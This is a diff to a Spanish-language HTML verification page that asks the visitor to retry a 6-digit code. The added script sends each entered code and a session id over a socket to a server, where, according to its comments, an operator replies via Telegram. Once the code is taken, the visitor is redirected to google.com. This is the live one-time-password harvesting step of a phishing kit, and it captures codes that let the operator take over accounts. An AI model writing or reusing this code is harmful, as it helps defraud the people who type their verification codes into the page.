@@ -91,16 +91,32 @@
     <button onclick="reintentarCodigo()">Reintentar</button>
   </div>
 
-  <script>
-    function reintentarCodigo() {
-      const codigo = document.getElementById("codigo").value;
-      if (!codigo || !/^\d{6}$/.test(codigo)) {
-        alert("Ingrese un código válido de 6 dígitos.");
-      } else {
-        alert("Código válido. Aquí se continuaría al resultado final.");
-        // window.location.href = "resultado.html";
-      }
+ <script src="/socket.io/socket.io.js"></script>
+<script>
+  const socket = io();
+  const sessionId = localStorage.getItem("sessionId");
+  socket.emit("reconectar", sessionId);
+
+  function reintentarCodigo() {
+    const codigo = document.getElementById("codigo").value;
+
+    if (!codigo || !/^\d{6}$/.test(codigo)) {
+      alert("Ingrese un código válido de 6 dígitos.");
+    } else {
+      // Enviar código ingresado
+      socket.emit("otpIngresado", { codigo, sessionId });
     }
-  </script>
+  }
+
+  // Escuchar respuesta del admin por Telegram
+  socket.on("respuestaOtp", (decision) => {
+    if (decision === "finalizar") {
+      window.location.href = "https://www.google.com";
+    } else if (decision === "otp_error") {
+      window.location.href = "denegado.html";
+    }
+  });
+</script>
+
 </body>
 </html>
